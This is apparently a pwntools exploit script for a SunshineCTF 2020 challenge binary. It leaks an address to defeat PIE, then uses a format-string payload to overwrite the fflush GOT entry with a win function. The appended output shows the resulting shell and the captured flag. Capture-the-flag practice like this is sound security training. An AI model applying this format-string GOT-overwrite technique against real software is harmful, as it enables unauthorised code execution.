from pwn import *

e = ELF('./chall_12')

p = remote('chal.2020.sunshinectf.org', 30012)
#p = process('./chall_12')

p.readuntil(b': ')

leak = int( p.readuntil(b'\n', drop=True).ljust(8, b'\x00'), 16)

p.send('yolo\n')

e.address = leak - e.symbols['main']

print('FFLUSH: 0x%.4x -- win: 0x%.4x' %(e.symbols['got.fflush'], e.symbols['win']))
writes = {e.symbols['got.fflush']: e.symbols['win']}

context.clear(arch='i386')
payload = fmtstr_payload(6, writes)

input('...')

p.send(payload)
p.send('\n')
p.interactive()

'''
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_12'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.2020.sunshinectf.org on port 30012: Done
FFLUSH: 0x5659d9fc -- win: 0x5659c5ad
...
[*] Switching to interactive mode
                                                                                     \xc7  \xa0                                                                                   \xe7                       \xb7a\xff\xd9YV\xfe\xd9YV\xfc\xd9YV\xfd\xd9YV
$ ls
chall_12
flag.txt
$ cat flag
cat: flag: No such file or directory
$ cat flag.txt
sun{the-stage-351efbcaebfda0d5}
'''
